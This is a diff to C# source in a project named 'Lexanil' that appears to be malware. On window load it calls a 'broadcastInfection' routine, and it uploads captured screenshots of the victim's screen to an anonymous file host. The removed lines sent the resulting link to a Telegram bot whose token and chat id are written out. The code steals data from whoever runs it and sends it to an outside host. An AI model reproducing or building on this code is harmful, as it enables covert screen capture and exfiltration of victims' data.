@@ -43,7 +43,6 @@ namespace Lexanil
 
         private void MainWindow_Load(object sender, EventArgs e)
         {
-           
             broadcastInfection(); 
             //disableShortcuts();
             //prockilltmr.Start();
@@ -237,9 +236,6 @@ namespace Lexanil
                 byte[] responseArray = client.UploadFile("https://api.anonfiles.com/upload", Paths.ScreenShots + ".jpeg");
                 var response = System.Text.Encoding.ASCII.GetString(responseArray).ToString();
                 var match = Regex.Match(response, @"\w+://\w+.\w+/\w+/screencap-\d+_\w+").ToString();
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=-561001723&text={match}");
-                HttpWebResponse response2 = (HttpWebResponse)request.GetResponse();
-                Stream resStream = response2.GetResponseStream();
                 return match;
             }
         }
